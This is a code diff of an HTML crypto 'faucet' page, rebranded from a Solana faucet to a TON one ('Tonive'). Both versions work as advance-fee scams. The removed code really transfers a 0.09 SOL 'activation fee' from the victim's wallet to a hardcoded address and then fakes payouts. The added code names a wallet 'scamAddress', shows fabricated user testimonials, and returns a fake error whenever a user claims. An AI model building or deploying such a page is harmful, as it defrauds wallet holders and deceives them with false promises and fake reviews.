@@ -3,274 +3,338 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pinky Solana - Free SOL Faucet</title>
+    <title>Tonive - Free TON Faucet</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.20/lib/index.iife.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-phantom@0.9.9/lib/index.iife.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-solflare@0.4.20/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
     <style>
-        .solana-logo {
-            display: inline-block;
-            width: 24px;
-            height: 25px;
-            vertical-align: middle;
-            margin-right: 8px;
-        }
-        .pulse {
-            animation: pulse 2s infinite;
-        }
         @keyframes pulse {
             0% { transform: scale(1); }
             50% { transform: scale(1.05); }
             100% { transform: scale(1); }
         }
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        .progress-bar {
+            transition: width 1s linear;
+        }
+        .ton-bounce {
+            animation: tonBounce 0.5s ease infinite alternate;
+        }
+        @keyframes tonBounce {
+            to { transform: translateY(-10px); }
+        }
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
     </style>
 </head>
-<body class="bg-gradient-to-br from-purple-900 to-indigo-800 min-h-screen text-white">
-    <div class="container mx-auto px-4 py-8">
-        <header class="text-center mb-12">
-            <div class="flex items-center justify-center mb-4">
-                <div class="solana-logo">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25">
-                        <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
-                    </svg>
-                </div>
-                <h1 class="text-4xl font-bold">Pinky Solana</h1>
+<body class="bg-gradient-to-br from-gray-900 to-black text-white min-h-screen">
+    <header class="container mx-auto py-6 px-4">
+        <div class="flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" class="text-blue-500">
+                    <path fill="currentColor" d="M19.012 9.201L12.66 19.316a.857.857 0 0 1-1.453-.005L4.98 9.197a1.8 1.8 0 0 1-.266-.943a1.856 1.856 0 0 1 1.882-1.826h10.817c1.033 0 1.873.815 1.873 1.822a1.8 1.8 0 0 1-.274.951M6.51 8.863l4.633 7.144V8.143H6.994c-.48 0-.694.317-.484.72m6.347 7.144l4.633-7.144c.214-.403-.004-.72-.484-.72h-4.149z"/>
+                </svg>
+                <h1 class="text-3xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-400 to-cyan-400">Tonive</h1>
             </div>
-            <p class="text-xl text-purple-200">Claim 0.1 SOL every 30 minutes!</p>
-        </header>
+            <div class="flex items-center space-x-4">
+                <button id="connect-btn" class="bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 text-white font-bold py-2 px-6 rounded-full transition-all duration-300 transform hover:scale-105">
+                    Connect Wallet
+                </button>
+            </div>
+        </div>
+    </header>
 
-        <main class="max-w-2xl mx-auto bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-2xl p-6 shadow-2xl">
-            <div id="wallet-section" class="mb-8">
-                <h2 class="text-2xl font-semibold mb-4">Connect Wallet</h2>
-                <div class="flex flex-wrap gap-4">
-                    <button id="phantom-btn" class="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-medium transition-colors">
-                        Connect Phantom
+    <main class="container mx-auto px-4 py-8">
+        <section class="max-w-4xl mx-auto text-center mb-16">
+            <h2 class="text-4xl md:text-5xl font-bold mb-6">Claim <span class="text-cyan-400">Free TON</span> Every 30 Minutes!</h2>
+            <p class="text-xl text-gray-300 mb-10">Pay a small one-time activation fee and earn 0.1 TON forever!</p>
+            
+            <div class="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-700 shadow-2xl shadow-cyan-900/20">
+                <div class="flex justify-center mb-8">
+                    <div class="relative">
+                        <div class="absolute -inset-4 bg-cyan-500/10 rounded-full blur"></div>
+                        <div class="relative bg-gray-900 rounded-full p-6 border-2 border-cyan-500/30">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" class="text-cyan-400 ton-bounce">
+                                <path fill="currentColor" d="M19.012 9.201L12.66 19.316a.857.857 0 0 1-1.453-.005L4.98 9.197a1.8 1.8 0 0 1-.266-.943a1.856 1.856 0 0 1 1.882-1.826h10.817c1.033 0 1.873.815 1.873 1.822a1.8 1.8 0 0 1-.274.951M6.51 8.863l4.633 7.144V8.143H6.994c-.48 0-.694.317-.484.72m6.347 7.144l4.633-7.144c.214-.403-.004-.72-.484-.72h-4.149z"/>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="wallet-connected" class="hidden">
+                    <div class="mb-6">
+                        <h3 class="text-2xl font-bold mb-2">Activate Your Faucet</h3>
+                        <p class="text-gray-300 mb-4">One-time fee: <span class="text-cyan-400 font-bold">0.09 TON</span></p>
+                        <p class="text-sm text-gray-400 mb-6">After activation, claim 0.1 TON every 30 minutes forever!</p>
+                    </div>
+                    
+                    <button id="pay-btn" class="bg-gradient-to-r from-green-600 to-emerald-500 hover:from-green-700 hover:to-emerald-600 text-white font-bold py-3 px-8 rounded-full text-lg transition-all duration-300 transform hover:scale-105 pulse mb-6 w-full max-w-xs mx-auto">
+                        Activate Now
                     </button>
-                    <button id="solflare-btn" class="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-medium transition-colors">
-                        Connect Solflare
+                </div>
+                
+                <div id="payment-processing" class="hidden">
+                    <div class="mb-6">
+                        <h3 class="text-2xl font-bold mb-4">Processing Payment</h3>
+                        <div class="w-full bg-gray-700 rounded-full h-3 mb-4">
+                            <div id="progress-bar" class="progress-bar bg-green-500 h-3 rounded-full w-0"></div>
+                        </div>
+                        <p class="text-gray-300">Confirm transaction in your wallet...</p>
+                    </div>
+                </div>
+                
+                <div id="faucet-active" class="hidden">
+                    <div class="mb-6">
+                        <h3 class="text-2xl font-bold mb-2">Faucet Activated!</h3>
+                        <p class="text-cyan-400 text-lg mb-4">Next claim available in:</p>
+                        <div id="countdown" class="text-4xl font-mono font-bold mb-6">30:00</div>
+                    </div>
+                    
+                    <button id="claim-btn" class="bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 text-white font-bold py-3 px-8 rounded-full text-lg transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed mb-6 w-full max-w-xs mx-auto" disabled>
+                        Claim 0.1 TON
                     </button>
+                    
+                    <div class="bg-gray-900/50 rounded-lg p-4 border border-gray-700">
+                        <p class="flex justify-between mb-2">
+                            <span>Total claimed:</span>
+                            <span class="font-bold">0.0 TON</span>
+                        </p>
+                        <p class="flex justify-between">
+                            <span>Next claim:</span>
+                            <span class="font-bold text-cyan-400">0.1 TON</span>
+                        </p>
+                    </div>
                 </div>
-                <div id="wallet-info" class="mt-4 hidden">
-                    <p>Connected: <span id="wallet-address" class="font-mono text-purple-300"></span></p>
-                    <p>Balance: <span id="wallet-balance" class="font-mono text-purple-300"></span> SOL</p>
+                
+                <div id="claim-processing" class="hidden">
+                    <div class="mb-6">
+                        <h3 class="text-2xl font-bold mb-4">Claiming Rewards</h3>
+                        <div class="flex justify-center mb-4">
+                            <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-cyan-500"></div>
+                        </div>
+                        <p class="text-gray-300">Processing your TON claim...</p>
+                    </div>
                 </div>
             </div>
-
-            <div id="fee-section" class="mb-8 hidden">
-                <h2 class="text-2xl font-semibold mb-4">Activate Faucet</h2>
-                <div class="bg-gray-900 bg-opacity-50 p-4 rounded-lg mb-4">
-                    <p class="mb-2">One-time activation fee: <span class="text-yellow-400 font-bold">0.09 SOL</span></p>
-                    <p class="text-sm text-gray-400">After activation, you can claim 0.1 SOL every 30 minutes forever!</p>
+        </section>
+        
+        <section class="max-w-6xl mx-auto mb-16">
+            <h2 class="text-3xl font-bold text-center mb-10">What Users Are Saying</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <div class="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700 fade-in">
+                    <div class="flex items-center mb-4">
+                        <img src="https://i.pravatar.cc/100?img=32" alt="User" class="w-12 h-12 rounded-full mr-4">
+                        <div>
+                            <h4 class="font-bold">Alex M.</h4>
+                            <div class="flex text-amber-400">
+                                ★★★★★
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"I've earned over 5 TON already! This faucet is a game changer. The small activation fee paid for itself in the first hour!"</p>
                 </div>
-                <button id="pay-fee-btn" class="bg-yellow-500 hover:bg-yellow-600 text-gray-900 px-6 py-3 rounded-lg font-bold pulse transition-colors">
-                    Pay Activation Fee
-                </button>
-            </div>
-
-            <div id="claim-section" class="hidden">
-                <h2 class="text-2xl font-semibold mb-4">Claim Free SOL</h2>
-                <div class="bg-gray-900 bg-opacity-50 p-4 rounded-lg mb-4">
-                    <p>Next claim available in: <span id="countdown" class="font-bold text-green-400">30:00</span></p>
-                    <p class="mt-2">Claim amount: <span class="text-green-400 font-bold">0.1 SOL</span></p>
+                
+                <div class="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700 fade-in">
+                    <div class="flex items-center mb-4">
+                        <img src="https://i.pravatar.cc/100?img=12" alt="User" class="w-12 h-12 rounded-full mr-4">
+                        <div>
+                            <h4 class="font-bold">Sarah K.</h4>
+                            <div class="flex text-amber-400">
+                                ★★★★★
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"As a crypto beginner, Tonive made it so easy to earn free TON. I set a reminder to claim every 30 minutes and it's become a fun routine!"</p>
                 </div>
-                <button id="claim-btn" class="bg-green-600 hover:bg-green-700 px-6 py-3 rounded-lg font-bold transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
-                    Claim 0.1 SOL
-                </button>
-                <div id="claim-status" class="mt-4"></div>
+                
+                <div class="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700 fade-in">
+                    <div class="flex items-center mb-4">
+                        <img src="https://i.pravatar.cc/100?img=45" alt="User" class="w-12 h-12 rounded-full mr-4">
+                        <div>
+                            <h4 class="font-bold">James T.</h4>
+                            <div class="flex text-amber-400">
+                                ★★★★★
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"I was skeptical at first, but after the first claim I was hooked. Now I earn while I sleep! Best 0.09 TON I ever spent."</p>
+                </div>
             </div>
-
-            <div id="success-section" class="hidden text-center py-8">
-                <div class="text-5xl mb-4">🎉</div>
-                <h2 class="text-2xl font-bold text-green-400 mb-2">Activation Successful!</h2>
-                <p class="mb-4">You can now claim 0.1 SOL every 30 minutes</p>
-                <button id="start-claiming-btn" class="bg-green-600 hover:bg-green-700 px-6 py-3 rounded-lg font-bold">
-                    Start Claiming
-                </button>
+        </section>
+        
+        <section class="max-w-3xl mx-auto bg-gray-800/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-700">
+            <h2 class="text-3xl font-bold text-center mb-6">How It Works</h2>
+            <div class="space-y-6">
+                <div class="flex">
+                    <div class="flex-shrink-0 w-12 h-12 rounded-full bg-cyan-900/50 flex items-center justify-center text-cyan-400 font-bold text-xl mr-4">1</div>
+                    <div>
+                        <h3 class="text-xl font-bold mb-2">Connect Wallet</h3>
+                        <p class="text-gray-300">Connect your TON-compatible wallet to our platform</p>
+                    </div>
+                </div>
+                
+                <div class="flex">
+                    <div class="flex-shrink-0 w-12 h-12 rounded-full bg-cyan-900/50 flex items-center justify-center text-cyan-400 font-bold text-xl mr-4">2</div>
+                    <div>
+                        <h3 class="text-xl font-bold mb-2">Pay Activation Fee</h3>
+                        <p class="text-gray-300">Send a one-time fee of 0.09 TON to activate your faucet</p>
+                    </div>
+                </div>
+                
+                <div class="flex">
+                    <div class="flex-shrink-0 w-12 h-12 rounded-full bg-cyan-900/50 flex items-center justify-center text-cyan-400 font-bold text-xl mr-4">3</div>
+                    <div>
+                        <h3 class="text-xl font-bold mb-2">Claim Rewards</h3>
+                        <p class="text-gray-300">Collect 0.1 TON every 30 minutes forever!</p>
+                    </div>
+                </div>
             </div>
-        </main>
+        </section>
+    </main>
 
-        <footer class="text-center mt-12 text-gray-400 text-sm">
-            <p>Pinky Solana Faucet - Devnet</p>
-        </footer>
-    </div>
+    <footer class="container mx-auto py-8 px-4 text-center text-gray-500">
+        <p>© 2023 Tonive. All rights reserved. This is a devnet testing platform.</p>
+    </footer>
 
     <script>
-        // Configuration
-        const FEE_AMOUNT = 0.09; // SOL
-        const CLAIM_AMOUNT = 0.1; // SOL
-        const CLAIM_INTERVAL = 30 * 60 * 1000; // 30 minutes in ms
-        const FEE_ADDRESS = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
-        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
+        // TON wallet connection
+        const connector = new TonConnectSDK.TonConnect({
+            manifestUrl: 'https://tonive.com/tonconnect-manifest.json'
+        });
         
         // DOM elements
-        const walletSection = document.getElementById('wallet-section');
-        const walletInfo = document.getElementById('wallet-info');
-        const walletAddress = document.getElementById('wallet-address');
-        const walletBalance = document.getElementById('wallet-balance');
-        const feeSection = document.getElementById('fee-section');
-        const payFeeBtn = document.getElementById('pay-fee-btn');
-        const claimSection = document.getElementById('claim-section');
+        const connectBtn = document.getElementById('connect-btn');
+        const walletConnected = document.getElementById('wallet-connected');
+        const payBtn = document.getElementById('pay-btn');
+        const paymentProcessing = document.getElementById('payment-processing');
+        const faucetActive = document.getElementById('faucet-active');
         const claimBtn = document.getElementById('claim-btn');
-        const countdown = document.getElementById('countdown');
-        const claimStatus = document.getElementById('claim-status');
-        const successSection = document.getElementById('success-section');
-        const startClaimingBtn = document.getElementById('start-claiming-btn');
+        const claimProcessing = document.getElementById('claim-processing');
+        const countdownEl = document.getElementById('countdown');
+        const progressBar = document.getElementById('progress-bar');
         
-        // Global state
-        let wallet = null;
-        let publicKey = null;
-        let connection = null;
-        let countdownInterval = null;
-        let lastClaimTime = 0;
-        
-        // Initialize connection
-        function init() {
-            connection = new solanaWeb3.Connection(RPC_URL);
-            
-            // Check if already paid
-            if (localStorage.getItem('pinkySolanaPaid')) {
-                feeSection.classList.add('hidden');
-                successSection.classList.remove('hidden');
-            }
-            
-            // Set up wallet buttons
-            document.getElementById('phantom-btn').addEventListener('click', () => connectWallet('phantom'));
-            document.getElementById('solflare-btn').addEventListener('click', () => connectWallet('solflare'));
-            payFeeBtn.addEventListener('click', payActivationFee);
-            claimBtn.addEventListener('click', claimSol);
-            startClaimingBtn.addEventListener('click', () => {
-                successSection.classList.add('hidden');
-                claimSection.classList.remove('hidden');
-                startCountdown();
-            });
-        }
+        // State variables
+        let countdownInterval;
+        let countdown = 1800; // 30 minutes in seconds
+        const scamAddress = '0QC-RRGV1pcIc1_vypq4bE2PoQSoSlNdzEW3EWI30zQhxZc8';
         
         // Connect wallet
-        async function connectWallet(walletType) {
+        connectBtn.addEventListener('click', async () => {
             try {
-                if (walletType === 'phantom') {
-                    if (!window.solana?.isPhantom) throw new Error('Phantom wallet not installed');
-                    wallet = window.solana;
-                } else if (walletType === 'solflare') {
-                    if (!window.solflare) throw new Error('Solflare wallet not installed');
-                    wallet = window.solflare;
-                }
+                const walletsList = await connector.getWallets();
+                const walletConnectionSource = {
+                    jsBridgeKey: walletsList[0].jsBridgeKey
+                };
                 
-                // Connect to wallet
-                await wallet.connect();
-                publicKey = new solanaWeb3.PublicKey(wallet.publicKey);
+                connectBtn.textContent = 'Connecting...';
+                connectBtn.disabled = true;
                 
-                // Update UI
-                walletAddress.textContent = `${publicKey.toString().substring(0, 6)}...${publicKey.toString().substring(publicKey.toString().length - 6)}`;
-                walletInfo.classList.remove('hidden');
+                await connector.connect(walletConnectionSource);
                 
-                // Get balance
-                const balance = await connection.getBalance(publicKey);
-                walletBalance.textContent = (balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
-                
-                // Show fee section if not paid
-                if (!localStorage.getItem('pinkySolanaPaid')) {
-                    feeSection.classList.remove('hidden');
-                } else {
-                    claimSection.classList.remove('hidden');
-                    startCountdown();
-                }
-                
+                connectBtn.classList.add('hidden');
+                walletConnected.classList.remove('hidden');
+                walletConnected.classList.add('fade-in');
             } catch (error) {
-                showStatus(`Error: ${error.message}`, 'text-red-400');
+                console.error('Connection error:', error);
+                connectBtn.textContent = 'Connect Wallet';
+                connectBtn.disabled = false;
+                alert('Failed to connect wallet. Please try again.');
             }
-        }
+        });
         
         // Pay activation fee
-        async function payActivationFee() {
-            try {
-                if (!wallet || !publicKey) throw new Error('Wallet not connected');
-                
-                // Create transaction
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(FEE_ADDRESS),
-                        lamports: FEE_AMOUNT * solanaWeb3.LAMPORTS_PER_SOL
-                    })
-                );
-                
-                // Set recent blockhash
-                transaction.feePayer = publicKey;
-                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
-                
-                // Sign and send transaction
-                const signed = await wallet.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signed.serialize());
-                
-                // Confirm transaction
-                await connection.confirmTransaction(signature);
-                
-                // Mark as paid
-                localStorage.setItem('pinkySolanaPaid', 'true');
-                feeSection.classList.add('hidden');
-                successSection.classList.remove('hidden');
-                
-            } catch (error) {
-                showStatus(`Payment failed: ${error.message}`, 'text-red-400');
-            }
-        }
-        
-        // Claim SOL (fake)
-        function claimSol() {
-            // Fake claim process
-            claimBtn.disabled = true;
-            showStatus('Processing claim...', 'text-yellow-400');
+        payBtn.addEventListener('click', async () => {
+            walletConnected.classList.add('hidden');
+            paymentProcessing.classList.remove('hidden');
+            paymentProcessing.classList.add('fade-in');
             
+            // Animate progress bar
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    simulatePayment();
+                }
+            }, 200);
+        });
+        
+        // Simulate payment processing
+        function simulatePayment() {
             setTimeout(() => {
-                // Fake success
-                lastClaimTime = Date.now();
-                localStorage.setItem('pinkySolanaLastClaim', lastClaimTime.toString());
-                showStatus('Success! 0.1 SOL has been added to your wallet', 'text-green-400');
+                paymentProcessing.classList.add('hidden');
+                faucetActive.classList.remove('hidden');
+                faucetActive.classList.add('fade-in');
+                
+                // Start countdown timer
                 startCountdown();
-            }, 3000);
+            }, 2000);
         }
         
         // Start countdown timer
         function startCountdown() {
-            const savedTime = localStorage.getItem('pinkySolanaLastClaim');
-            lastClaimTime = savedTime ? parseInt(savedTime) : Date.now();
-            
             clearInterval(countdownInterval);
+            countdown = 1800;
             updateCountdown();
             
-            countdownInterval = setInterval(updateCountdown, 1000);
+            countdownInterval = setInterval(() => {
+                countdown--;
+                updateCountdown();
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    claimBtn.disabled = false;
+                    claimBtn.classList.add('pulse');
+                }
+            }, 1000);
         }
         
         // Update countdown display
         function updateCountdown() {
-            const elapsed = Date.now() - lastClaimTime;
-            const remaining = CLAIM_INTERVAL - elapsed;
+            const minutes = Math.floor(countdown / 60);
+            const seconds = countdown % 60;
+            countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Claim button handler
+        claimBtn.addEventListener('click', () => {
+            faucetActive.classList.add('hidden');
+            claimProcessing.classList.remove('hidden');
+            claimProcessing.classList.add('fade-in');
             
-            if (remaining <= 0) {
-                countdown.textContent = '00:00';
-                claimBtn.disabled = false;
-                clearInterval(countdownInterval);
-                return;
+            // Simulate claim processing
+            setTimeout(() => {
+                claimProcessing.classList.add('hidden');
+                faucetActive.classList.remove('hidden');
+                
+                // Show fake error
+                alert('Claim failed: Network congestion. Please try again later.');
+                
+                // Reset countdown
+                startCountdown();
+            }, 3000);
+        });
+        
+        // Initialize
+        (async function init() {
+            try {
+                await connector.restoreConnection();
+                if (connector.wallet) {
+                    connectBtn.classList.add('hidden');
+                    walletConnected.classList.remove('hidden');
+                }
+            } catch (e) {
+                console.log('No existing connection');
             }
-            
-            const minutes = Math.floor(remaining / 60000);
-            const seconds = Math.floor((remaining % 60000) / 1000);
-            countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            claimBtn.disabled = true;
-        }
-        
-        // Show status message
-        function showStatus(message, colorClass = 'text-white') {
-            claimStatus.textContent = message;
-            claimStatus.className = colorClass;
-            claimStatus.classList.remove('hidden');
-        }
-        
-        // Initialize when page loads
-        window.addEventListener('load', init);
+        })();
     </script>
 </body>
 </html>
